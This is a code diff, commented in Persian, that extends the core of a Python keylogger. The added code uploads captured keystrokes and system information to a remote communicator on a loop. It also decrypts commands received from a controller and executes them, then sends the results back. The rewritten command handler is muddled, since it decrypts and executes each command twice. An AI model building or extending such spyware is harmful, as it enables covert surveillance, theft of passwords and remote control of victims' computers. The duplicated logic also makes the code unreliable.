@@ -37,11 +37,25 @@ class KeyloggerCore:
     def _data_sync_loop(self):
         while self.running:
             try:
-                self.logger.flush_buffer()
-                time.sleep(Config.CHECK_INTERVAL)
-            except Exception as e:
-                self._handle_error(f"Data sync error: {str(e)}")
+                # جمع‌آوری اطلاعات سیستمی
+                system_info = SystemCollector.collect_full()
 
+                # گرفتن اسکرین‌شات (نیاز به پیاده‌سازی)
+                # screenshot = self._capture_screenshot()
+
+                # ارسال داده‌ها
+                self.communicator.upload_data(
+                    keystrokes=self.logger.buffer.copy(),
+                    system_info=system_info,
+                    # screenshot=screenshot
+                )
+
+                self.logger.buffer.clear()
+                time.sleep(Config.CHECK_INTERVAL)
+
+            except Exception as e:
+                self._handle_error(f"Sync error: {str(e)}")
+                
     def _command_loop(self):
         while self.running:
             try:
@@ -63,13 +77,35 @@ class KeyloggerCore:
     def _process_commands(self, commands):
         for cmd in commands:
             try:
+                # اعتبارسنجی فیلدهای ضروری
+                if 'type' not in cmd or 'command' not in cmd:
+                    raise CommandError("Invalid command structure")
+
                 decrypted = self.encryption.decrypt(cmd['command'])
-                result = CommandHandler.execute(  # خطای اصلی اینجا رفع شد
-                    cmd['type'],
-                    json.loads(decrypted)
-                )  # پرانتز بسته اضافه شد
+                command_data = json.loads(decrypted)
+
+                # اعتبارسنجی ساختار دستور
+                if 'type' not in command_data:
+                    raise CommandError("Missing 'type' in decrypted command")
+
+                result = CommandHandler.execute(
+                    cmd['type'],  # یا command_data['type'] بسته به طراحی
+                    command_data
+                )
+                logging.info(f"Received command: {cmd}")  # لاگ داده خام
+                decrypted = self.encryption.decrypt(cmd['command'])
+                logging.info(f"Decrypted command: {decrypted}")  # لاگ داده رمزگشایی‌شده
+                command_data = json.loads(decrypted)
+                logging.info(f"Parsed command data: {command_data}")  # لاگ داده JSON
+                result = CommandHandler.execute(
+                    command_data['type'],  # اینجا از command_data استفاده می‌کنیم
+                    command_data['params']
+                )
                 self.communicator.send_command_result(cmd['id'], result)
-            except (EncryptionError, CommandError, json.JSONDecodeError) as e:
+
+            except (KeyError, JSONDecodeError) as e:
+                self._handle_error(f"Invalid command format: {str(e)}")
+            except Exception as e:
                 self._handle_error(f"Command execution failed: {str(e)}")
 
     def _handle_error(self, message):
